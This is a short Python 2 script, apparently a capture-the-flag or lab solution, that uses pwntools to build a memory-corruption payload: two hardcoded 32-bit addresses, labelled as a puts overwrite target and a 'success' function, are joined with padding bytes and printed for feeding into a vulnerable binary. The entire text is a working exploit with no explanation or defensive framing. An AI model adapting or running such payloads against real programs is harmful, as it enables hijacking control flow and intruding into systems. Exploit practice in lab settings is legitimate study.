from pwn import *

addr_puts_overwrite 	= '\x34\xa0\x04\x08'	#p32(0x0804a034, endian='little');
addr_success		= '\x35\x88\x04\x08'	#p32(0x08048835, endian='little');
junk			= '\x00' + '\x41'*27 + '\x42'*4 + '\x43'*8

payload			= addr_success + junk + addr_puts_overwrite
print payload

